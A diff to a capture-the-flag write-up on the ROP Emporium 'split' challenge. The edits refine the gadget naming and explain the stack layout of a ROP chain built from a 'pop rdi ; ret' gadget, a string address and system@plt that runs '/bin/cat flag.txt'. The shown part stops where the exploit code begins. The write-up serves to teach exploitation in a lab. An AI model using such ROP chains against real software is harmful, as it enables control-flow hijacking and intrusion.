@@ -94,7 +94,7 @@ In order to put this string into `rdi`, we will need a `pop rdi` gadget.
 ### pop rdi gadget
 We can find the gadget using the `ROPgadget` utility. 
 ```
-$ ROPgadget --binary split | grep "pop rdi"
+$ ROPgadget --binary split | grep "pop rdi ; ret"
 0x00000000004007c3 : pop rdi ; ret
 ```
 We can see that the address of the `pop rdi` gadget is `0x00000000004007c3`. 
@@ -161,7 +161,7 @@ Therefore the distance between the buffer and the saved return address is `offse
 ### Exploit requirements
 We have all the knowledge we need to create an exploit.
 	- [x] Number of padding bytes: `40`
-	- [x] Address of `pop rdi` gadget: `0x00000000004007c3`
+	- [x] Address of `pop rdi ; ret` gadget: `0x00000000004007c3`
 	- [x] Address of `/bin/cat flag.txt`: `0x601060`
 	- [x] Address of `call <system@plt>`: `0x000000000040074b`
 All that remains is to link these pieces of information to create a ROP chain.
@@ -176,7 +176,7 @@ This is what the ROP chain would look like on the stack.
 Stack:
 +---------------------------+
 |  00 00 00 00 00 40 07 c3  | <====== return address <------ rsp
-|  ( pop rdi )              |
+|  ( pop rdi ; ret )        |
 +---------------------------+
 |  00 00 00 00 00 60 10 60  | 
 |  ( /bin/cat flag.txt )    |
@@ -185,10 +185,10 @@ Stack:
 |  ( system@plt )           |
 +---------------------------+
 
-====================================================================
+======================================================================
 pwnme() return <------ rip
 # This gadget will pop the value pointed to by rsp into rip
-====================================================================
+======================================================================
 
 Stack:
 +---------------------------+
@@ -199,10 +199,11 @@ Stack:
 |  ( system@plt )           |
 +---------------------------+
 
-====================================================================
-pop rdi <------ rip
-# This gadget will pop the value pointed to by rsp into rdi
-====================================================================
+======================================================================
+pop rdi ; ret <------ rip
+# pop rdi: pop the value pointed to by rsp into rdi
+# ret: Move rsp 8 bytes higher, thus pointing to the system@plt gadget
+======================================================================
 
 Stack:
 +---------------------------+
@@ -213,10 +214,10 @@ Stack:
 Registers:
 rdi: 0x601060
 
-====================================================================
+======================================================================
 call <system@plt> <------ rip
 # This gadget makes a system call based on the argument in rdi
-====================================================================
+======================================================================
 ```
 ### Exploit
 ```python
